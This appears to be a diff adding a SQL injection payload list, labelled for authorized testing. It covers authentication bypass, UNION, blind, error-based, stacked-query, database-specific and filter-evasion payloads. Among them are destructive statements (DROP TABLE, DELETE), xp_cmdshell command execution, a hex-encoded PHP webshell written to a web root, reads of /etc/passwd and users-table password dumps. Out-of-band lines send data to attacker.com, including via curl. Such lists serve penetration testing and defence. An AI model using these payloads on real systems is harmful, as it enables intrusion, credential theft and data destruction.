@@ -1,0 +1,440 @@
+# Comprehensive SQL Injection Payloads
+# For authorized security testing only
+# Categories: Authentication Bypass, UNION, Time-Based, Error-Based, Stacked Queries
+
+# === AUTHENTICATION BYPASS ===
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'#
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR "1"="1
+" OR "1"="1"--
+" OR "1"="1"/*
+" OR "1"="1"#
+" OR 1=1--
+" OR 1=1#
+" OR 1=1/*
+') OR ('1'='1
+') OR ('1'='1'--
+') OR ('1'='1'/*
+") OR ("1"="1
+") OR ("1"="1"--
+admin'--
+admin'#
+admin'/*
+admin' --
+admin' #
+admin' /*
+admin"--
+admin"#
+' OR ''='
+" OR ""="
+' OR 'x'='x
+" OR "x"="x
+' OR 1=1 OR '1'='1
+1' OR '1'='1
+1" OR "1"="1
+1 OR 1=1
+1' OR 1=1--
+1" OR 1=1--
+-1' OR 1=1--
+-1" OR 1=1--
+-1 OR 1=1
+' OR 'a'='a
+" OR "a"="a
+') OR ('a'='a
+") OR ("a"="a
+' OR 1--
+" OR 1--
+or 1=1
+or 1=1--
+' or 1=1--
+" or 1=1--
+1' or '1'='1
+1') or ('1'='1
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+or true--
+' or true--
+" or true--
+') or true--
+or 1
+' or 1
+" or 1
+' or 1--
+" or 1--
+1) or (1=1
+') or (1=1
+") or (1=1
+'-'
+'&'
+'^'
+'*'
+'='
+0'<'2
+"-"
+"&"
+"^"
+"*"
+"="
+
+# === UNION-BASED INJECTION ===
+' UNION SELECT NULL--
+' UNION SELECT NULL, NULL--
+' UNION SELECT NULL, NULL, NULL--
+' UNION SELECT NULL, NULL, NULL, NULL--
+' UNION SELECT NULL, NULL, NULL, NULL, NULL--
+" UNION SELECT NULL--
+" UNION SELECT NULL, NULL--
+" UNION SELECT NULL, NULL, NULL--
+') UNION SELECT NULL--
+') UNION SELECT NULL, NULL--
+") UNION SELECT NULL--
+1' UNION SELECT 1--
+1' UNION SELECT 1,2--
+1' UNION SELECT 1,2,3--
+1' UNION SELECT 1,2,3,4--
+1' UNION SELECT 1,2,3,4,5--
+1" UNION SELECT 1--
+1" UNION SELECT 1,2--
+1" UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL, NULL--
+' UNION ALL SELECT NULL, NULL, NULL--
+" UNION ALL SELECT NULL--
+' UNION SELECT @@version--
+' UNION SELECT version()--
+' UNION SELECT user()--
+' UNION SELECT current_user()--
+' UNION SELECT database()--
+' UNION SELECT schema_name FROM information_schema.schemata--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT table_name,column_name FROM information_schema.columns--
+' UNION SELECT username,password FROM users--
+' UNION SELECT 1,username,password FROM users--
+' UNION SELECT NULL,username,password FROM users--
+1' UNION SELECT username,password FROM users--
+1' UNION SELECT NULL,username,password FROM users--
+' UNION SELECT CONCAT(username,':',password) FROM users--
+' UNION SELECT GROUP_CONCAT(username,':',password) FROM users--
+' UNION SELECT load_file('/etc/passwd')--
+' UNION SELECT load_file('c:\\boot.ini')--
+' UNION SELECT 0x3c3f706870206576616c28245f4745545b315d293b3f3e INTO OUTFILE '/var/www/html/shell.php'--
+-1' UNION SELECT 1--
+-1' UNION SELECT 1,2--
+-1' UNION SELECT 1,2,3--
+0 UNION SELECT 1--
+0 UNION SELECT 1,2--
+0 UNION SELECT 1,2,3--
+null' UNION SELECT 1--
+null' UNION SELECT 1,2--
+
+# === ORDER BY ENUMERATION ===
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--
+' ORDER BY 5--
+' ORDER BY 6--
+' ORDER BY 7--
+' ORDER BY 8--
+' ORDER BY 9--
+' ORDER BY 10--
+' ORDER BY 11--
+' ORDER BY 12--
+' ORDER BY 13--
+' ORDER BY 14--
+' ORDER BY 15--
+' ORDER BY 16--
+' ORDER BY 17--
+' ORDER BY 18--
+' ORDER BY 19--
+' ORDER BY 20--
+' ORDER BY 100--
+' ORDER BY 1000--
+" ORDER BY 1--
+" ORDER BY 2--
+" ORDER BY 3--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 1,2--
+1' ORDER BY 1,2,3--
+') ORDER BY 1--
+') ORDER BY 2--
+
+# === TIME-BASED BLIND ===
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+" AND SLEEP(5)--
+" AND SLEEP(5)#
+') AND SLEEP(5)--
+") AND SLEEP(5)--
+' OR SLEEP(5)--
+" OR SLEEP(5)--
+1' AND SLEEP(5)--
+1" AND SLEEP(5)--
+1') AND SLEEP(5)--
+'; SELECT SLEEP(5)--
+"; SELECT SLEEP(5)--
+' AND (SELECT SLEEP(5))--
+" AND (SELECT SLEEP(5))--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND BENCHMARK(5000000,MD5('test'))--
+" AND BENCHMARK(5000000,MD5('test'))--
+1' AND BENCHMARK(5000000,MD5('test'))--
+'; WAITFOR DELAY '0:0:5'--
+"; WAITFOR DELAY '0:0:5'--
+1'; WAITFOR DELAY '0:0:5'--
+1"; WAITFOR DELAY '0:0:5'--
+'); WAITFOR DELAY '0:0:5'--
+"); WAITFOR DELAY '0:0:5'--
+' WAITFOR DELAY '0:0:5'--
+" WAITFOR DELAY '0:0:5'--
+'; SELECT pg_sleep(5)--
+"; SELECT pg_sleep(5)--
+' || pg_sleep(5)--
+" || pg_sleep(5)--
+1'; SELECT pg_sleep(5)--
+1"; SELECT pg_sleep(5)--
+' AND pg_sleep(5)--
+" AND pg_sleep(5)--
+1' AND pg_sleep(5)--
+'||(SELECT PG_SLEEP(5))||'
+"||pg_sleep(5)||"
+1 AND pg_sleep(5)
+1 OR pg_sleep(5)
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+" AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+'; BEGIN DBMS_LOCK.SLEEP(5); END;--
+" AND UTL_INADDR.get_host_name((SELECT BANNER FROM v$version WHERE ROWNUM=1))--
+'; SELECT RANDOMBLOB(500000000/2)--
+'; SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--
+' AND IF(1=1,SLEEP(5),0)--
+" AND IF(1=1,SLEEP(5),0)--
+' AND IF(1=1,BENCHMARK(5000000,SHA1('test')),0)--
+
+# === ERROR-BASED ===
+' AND 1=CONVERT(int,(SELECT @@version))--
+" AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CONVERT(int,(SELECT user))--
+' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
+' AND extractvalue(1,concat(0x7e,(SELECT user())))--
+' AND extractvalue(1,concat(0x7e,(SELECT database())))--
+' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)))--
+' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--
+' AND updatexml(1,concat(0x7e,(SELECT user())),1)--
+' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
+' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version)),1)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT user())),1)--
+' AND polygon((SELECT * FROM (SELECT * FROM (SELECT @@version)a)b))--
+' AND geometrycollection((SELECT * FROM (SELECT * FROM (SELECT @@version)a)b))--
+' AND multipoint((SELECT * FROM (SELECT * FROM (SELECT @@version)a)b))--
+' AND multilinestring((SELECT * FROM (SELECT * FROM (SELECT @@version)a)b))--
+' AND multipolygon((SELECT * FROM (SELECT * FROM (SELECT @@version)a)b))--
+' AND linestring((SELECT * FROM (SELECT * FROM (SELECT @@version)a)b))--
+' AND exp(~(SELECT * FROM (SELECT @@version)a))--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(@@version)) USING utf8)))--
+
+# === STACKED QUERIES ===
+'; DROP TABLE users--
+"; DROP TABLE users--
+'; DROP DATABASE test--
+'; TRUNCATE TABLE users--
+'; DELETE FROM users--
+'; UPDATE users SET password='hacked'--
+'; INSERT INTO users VALUES('hacker','hacked')--
+'; CREATE TABLE hacked(data varchar(200))--
+'; exec master..xp_cmdshell 'whoami'--
+'; exec master..xp_cmdshell 'dir'--
+'; exec master..xp_cmdshell 'net user'--
+'; exec xp_cmdshell 'ping 10.0.0.1'--
+'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--
+'; DECLARE @q varchar(200);SET @q='\\attacker.com\share\file';EXEC master..xp_dirtree @q--
+
+# === BOOLEAN-BASED BLIND ===
+' AND 1=1--
+' AND 1=2--
+" AND 1=1--
+" AND 1=2--
+' AND 'a'='a'--
+' AND 'a'='b'--
+" AND "a"="a"--
+" AND "a"="b"--
+1' AND 1=1--
+1' AND 1=2--
+1" AND 1=1--
+1" AND 1=2--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))=115--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT LENGTH(database()))>0--
+' AND (SELECT LENGTH(database()))>5--
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a'--
+' AND ORD(MID((SELECT IFNULL(CAST(database() AS NCHAR),0x20)),1,1))>64--
+
+# === MYSQL SPECIFIC ===
+' AND 1=1#
+' AND 1=2#
+' OR 1=1#
+" OR 1=1#
+' UNION SELECT 1#
+' UNION SELECT 1,2#
+' UNION SELECT 1,2,3#
+'/**/OR/**/1=1#
+'/**/AND/**/1=1#
+' /*!50000OR*/ 1=1--
+' /*!50000AND*/ 1=1--
+' /*!50000UNION*/ SELECT 1--
+'/*!50000UNION*//*!50000SELECT*/1--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#
+' OR (SELECT * FROM (SELECT(SLEEP(5)))a)#
+'%20AND%201=1--
+'%20OR%201=1--
+'%20UNION%20SELECT%201--
+'%0AAND%0A1=1--
+'%0AOR%0A1=1--
+'%0AUNION%0ASELECT%0A1--
+' AND BINARY 'a'='a'--
+' COLLATE utf8_general_ci='--
+' LIKE 'admin%'--
+' RLIKE '^admin'--
+' REGEXP '^admin'--
+
+# === MSSQL SPECIFIC ===
+' AND 1=1--
+' AND 1=2--
+' UNION SELECT NULL--
+' UNION SELECT @@version--
+'; SELECT @@version--
+'; SELECT user_name()--
+'; SELECT DB_NAME()--
+'; SELECT name FROM master..sysdatabases--
+'; SELECT name FROM sysobjects WHERE xtype='U'--
+'; SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
+'; exec master..xp_cmdshell 'whoami'--
+'; EXEC xp_cmdshell 'dir c:\'--
+'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName'--
+'; CREATE PROCEDURE sp_backdoor AS EXEC master..xp_cmdshell 'cmd.exe'--
+' HAVING 1=1--
+' GROUP BY columnname HAVING 1=1--
+' AND LEN(DB_NAME())>0--
+' AND UNICODE(SUBSTRING(DB_NAME(),1,1))>0--
+
+# === POSTGRESQL SPECIFIC ===
+' AND 1=1--
+' AND 1=2--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT version()--
+' UNION SELECT current_user--
+' UNION SELECT current_database()--
+' UNION SELECT table_name FROM information_schema.tables--
+'; SELECT pg_sleep(5)--
+' AND pg_sleep(5)--
+'||pg_sleep(5)--
+' AND (SELECT pg_sleep(5))--
+'; COPY (SELECT '') TO PROGRAM 'id'--
+'; DROP TABLE users--
+' AND CAST((SELECT version()) AS int)>0--
+' AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)>0--
+' AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>0--
+'; CREATE TABLE hacked(data text); COPY hacked FROM '/etc/passwd'--
+
+# === ORACLE SPECIFIC ===
+' AND 1=1--
+' AND 1=2--
+' UNION SELECT NULL FROM DUAL--
+' UNION SELECT NULL,NULL FROM DUAL--
+' UNION SELECT banner FROM v$version--
+' UNION SELECT user FROM dual--
+' UNION SELECT table_name FROM all_tables--
+' UNION SELECT column_name FROM all_tab_columns--
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
+' AND UTL_INADDR.get_host_name('attacker.com') IS NOT NULL--
+' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))=1--
+' AND extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/"> %remote;]>'),'/l')=1--
+
+# === SQLITE SPECIFIC ===
+' AND 1=1--
+' AND 1=2--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT sqlite_version()--
+' UNION SELECT name FROM sqlite_master WHERE type='table'--
+' UNION SELECT sql FROM sqlite_master--
+' UNION SELECT tbl_name FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'--
+' AND RANDOMBLOB(500000000/2)--
+' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+' GLOB '*'--
+
+# === BYPASSES & OBFUSCATION ===
+'/**/OR/**/1=1--
+'/**/AND/**/1=1--
+'/**/UNION/**/SELECT/**/1--
+'%09OR%091=1--
+'%09AND%091=1--
+'%0BOR%0B1=1--
+'%0COR%0C1=1--
+'%0DOR%0D1=1--
+'%A0OR%A01=1--
+' AnD 1=1--
+' aNd 1=1--
+' oR 1=1--
+' Or 1=1--
+' UNion SElect 1--
+' uNiOn sElEcT 1--
+' union%0Aselect 1--
+' union%0Bselect 1--
+' union%0Cselect 1--
+' union%0Dselect 1--
+' union%A0select 1--
+'/*!50000union*/select 1--
+'/*!union*//*!select*/1--
+' un/**/ion se/**/lect 1--
+' %55nion %53elect 1--
+' %2527 OR 1=1--
+' %%2527 OR 1=1--
+' %252527 OR 1=1--
+'+OR+1=1--
+'+UNION+SELECT+1--
+'||1=1--
+' && 1=1--
+' -1 OR 1=1--
+' -1' OR 1=1--
+' ^1=1--
+%27%20OR%201=1--
+%27%20AND%201=1--
+%27%20UNION%20SELECT%201--
+%2527%20OR%201=1--
+%252527%20OR%201=1--
+';%20--
+'%3B%20--
+%00' OR 1=1--
+%00" OR 1=1--
+' OR 1=1%00--
+' OR 'x'='x%00--
+
+# === OUT-OF-BAND ===
+'; SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))--
+'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--
+'; SELECT DBMS_LDAP.INIT(('attacker.com',80)--
+' AND extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT user FROM dual)||'.attacker.com/"> %remote;]>'),'/l')=1--
+'; EXEC master..xp_dirtree '\\attacker.com\share'--
+'; COPY (SELECT user) TO PROGRAM 'curl http://attacker.com/'--
